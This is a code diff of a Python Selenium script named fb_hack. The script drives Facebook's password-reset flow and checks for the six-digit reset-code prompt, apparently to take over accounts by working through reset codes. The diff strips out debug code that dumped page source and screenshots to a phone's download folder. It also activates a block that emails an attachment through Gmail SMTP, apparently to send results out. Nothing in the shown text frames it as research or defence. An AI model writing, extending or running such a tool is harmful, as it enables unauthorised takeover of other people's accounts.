@@ -55,20 +55,6 @@ def fb_hack(email, codex, respect):
   search_button = driver.find_element(by = By.NAME, value = "reset_action")
   search_button.click()
   sleep(2)
-  """html = driver.page_source
-  soup = BeautifulSoup(html, 'html.parser')
-  with open("output1.txt", "w") as file:
-    file.write(str(soup))
-  soup = BeautifulSoup(html, 'html.parser')
-  with open("output1.html", "w") as file:
-    file.write(str(soup))
-  source_file = "output1.txt" 
-  destination_folder = "/sdcard/download/output1.txt" 
-  shutil.move(source_file, destination_folder)
-  source_file = "output1.html" 
-  destination_folder = "/sdcard/download/output1.html" 
-  shutil.move(source_file, destination_folder)
-  driver.save_screenshot("/sdcard/download/tester.png")"""
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -133,7 +119,7 @@ while past >= 6:
   past += 1
   past = 1
 
-"""subject = "An email with attachment from Python"
+subject = "An email with attachment from Python"
 body = "This is an email with attachment sent from Python"
 # Create a multipart message and set headers
 message = MIMEMultipart()
@@ -167,4 +153,3 @@ context = ssl.create_default_context()
 with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
     server.login(sender_email, password)
     server.sendmail(sender_email, receiver_email, text)
-"""
